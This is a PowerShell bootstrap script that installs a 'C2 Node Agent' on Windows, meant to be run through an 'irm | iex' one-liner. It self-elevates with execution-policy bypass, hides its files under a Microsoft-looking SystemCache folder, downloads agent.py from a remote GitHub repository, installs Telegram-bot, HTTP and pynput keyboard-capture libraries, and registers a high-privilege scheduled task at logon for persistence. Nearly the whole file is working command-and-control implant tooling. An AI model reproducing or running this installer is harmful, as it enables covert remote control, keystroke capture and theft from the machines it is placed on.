<#
.SYNOPSIS
    C2 Node Agent - One-Liner Bootstrap Installer (Clean Install)
    
.DESCRIPTION
    This script sets up the C2 Node Agent on a Windows machine.
    Modes:
    - Admin (Default): Requires/Requests elevation, registers High-privilege task, updates Machine PATH.
    - Normal: Runs as current user, registers User-level task, updates User PATH only.

.NOTES
    Run with: irm https://your-gist-url/install.ps1 | iex
#>

param(
    [string]$InstallPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache",
    [string]$Mode = "Admin", # Options: "Admin", "Normal"
    [switch]$Force
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# =============================================================================
# UI & HELPER FUNCTIONS
# =============================================================================

function Write-Step { param($msg) Write-Host "`n[*] $msg" -ForegroundColor Cyan }
function Write-Success { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }
function Write-Err { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }

function Test-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# =============================================================================
# INITIALIZATION & ELEVATION CHECK
# =============================================================================

Clear-Host
Write-Host "C2 Agent Installer (Debug Mode)" -ForegroundColor Magenta

# Interactive Admin Prompt
if (-not (Test-Admin)) {
    $response = Read-Host "Run with Administrator privileges (Recommended for full features)? (y/n)"
    
    if ($response -match "^[yY]") {
        $Mode = "Admin"
    } else {
        $Mode = "Normal"
    }
} else {
    $Mode = "Admin"
}

Write-Host "Installer running in: $Mode Mode" -ForegroundColor Gray

# Self-Elevation Logic (Only for Admin Mode)
if ($Mode -eq "Admin") {
    if (-not (Test-Admin)) {
        try {
            if ($PSCommandPath) {
                Write-Step "Restarting as Administrator..."
                Start-Process powerShell -ArgumentList "-NoProfile", "-ExecutionPolicy Bypass", "-File `"$PSCommandPath`"", "-Mode Admin", "-Force" -Verb RunAs
                exit
            } else {
                Write-Warn "Cannot self-elevate in this context. Continuing as Normal user..."
                $Mode = "Normal"
            }
        } catch {
            Write-Warn "Elevation failed. Continuing as Normal user..."
            $Mode = "Normal"
        }
    }
}

# =============================================================================
# MAIN INSTALLATION LOGIC
# =============================================================================

try {
    # 1. Cleanup
    # -------------------------------------------------------------------------
    Write-Step "Cleaning up old processes..."
    try {
        $procs = Get-WmiObject Win32_Process | Where-Object { 
            ($_.Name -eq "python.exe" -or $_.Name -eq "pythonw.exe") -and ($_.CommandLine -like "*agent.py*")
        }
        if ($procs) {
            foreach ($p in $procs) {
                Write-Warn "Killing process: $($p.ProcessId)"
                Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
            }
        }
            
        if ($Mode -eq "Admin") {
            Get-ScheduledTask | Where-Object { $_.TaskName -like "*C2Agent*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue 
        } else {
            Get-ScheduledTask | Where-Object { $_.TaskName -like "*C2Agent*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Warn "Cleanup minor error: $_"
    }

    # 2. Python Setup
    # -------------------------------------------------------------------------
    Write-Step "Checking Python..."
    $pythonPath = $null
    
    if (Get-Command "python" -ErrorAction SilentlyContinue) {
        $pythonPath = (Get-Command "python").Source
        Write-Success "Found existing Python: $pythonPath"
    }

    if (-not $pythonPath) {
        Write-Step "Installing Python via Winget..."
        try {
            winget install Python.Python.3.12 --accept-source-agreements --accept-package-agreements --silent --disable-interactivity
            
            # Update Path
            if ($Mode -eq "Admin") {
                $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
            } else {
                $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "User")
            }
            $pythonPath = (Get-Command "python" -ErrorAction SilentlyContinue).Source
        } catch {
            Write-Err "Winget install failed: $_"
        }
    }
    
    if (-not $pythonPath) {
        Write-Err "Python not found. Please install Python 3 manualy."
        # Don't exit, try to continue just in case
    }

    $pythonDir = Split-Path $pythonPath
    $pythonwPath = Join-Path $pythonDir "pythonw.exe"
    if (-not (Test-Path $pythonwPath)) { $pythonwPath = $pythonPath }

    # 3. Project Files
    # -------------------------------------------------------------------------
    Write-Step "Setting up directories..."
    Write-Host "Target: $InstallPath" -ForegroundColor Gray
    
    if (-not (Test-Path $InstallPath)) {
        New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    }
    
    $agentPyPath = Join-Path $InstallPath "agent.py"
    if (-not (Test-Path $agentPyPath)) {
        Write-Step "Downloading agent.py..."
        try {
            $downloadUrl = "https://raw.githubusercontent.com/adnansamirswe/c2master/main/backend/agent.py"
             Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing
             Write-Success "Downloaded agent.py"
        } catch {
             Write-Warn "Download failed, creating placeholder..."
             @"
# C2 Agent - Placeholder
import time
while True: time.sleep(60)
"@ | Set-Content -Path $agentPyPath -Encoding UTF8
        }
    }

    # 4. Virtual Env & Deps
    # -------------------------------------------------------------------------
    Write-Step "Setting up Virtual Environment..."
    $venvPath = Join-Path $InstallPath "venv"
    if (-not (Test-Path $venvPath)) {
        & $pythonPath -m venv $venvPath
    }
    
    $venvPython = Join-Path $venvPath "Scripts\python.exe"
    $venvPythonw = Join-Path $venvPath "Scripts\pythonw.exe"
    
    Write-Step "Installing dependencies..."
    $reqFile = Join-Path $InstallPath "requirements.txt"
    @"
python-telegram-bot>=21.0
httpx>=0.27.0
pynput>=1.7.0
"@ | Set-Content -Path $reqFile -Encoding UTF8

    & $venvPython -m pip install -r $reqFile --quiet --disable-pip-version-check
    Write-Success "Dependencies ready"

    # 5. Scheduled Task
    # -------------------------------------------------------------------------
    Write-Step "Registering Scheduled Task..."
    $taskName = "C2Agent"
    $action = New-ScheduledTaskAction -Execute $venvPythonw -Argument "`"$agentPyPath`"" -WorkingDirectory $InstallPath
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    
    if ($Mode -eq "Admin") {
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive
        Write-Host "  -> High Privilege Task" -ForegroundColor Gray
    } else {
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited -LogonType Interactive
        Write-Host "  -> Standard Privilege Task" -ForegroundColor Gray
    }
    
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -ExecutionTimeLimit (New-TimeSpan -Days 365)
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
    
    Start-ScheduledTask -TaskName $taskName
    Write-Success "Task registered and started!"

} catch {
    Write-Err "Installation Error: $_"
    Write-Host "Stack Trace: $($_.ScriptStackTrace)" -ForegroundColor Red
}

Write-Host "`nDone." -ForegroundColor Gray
# No auto-exit so you can read the output
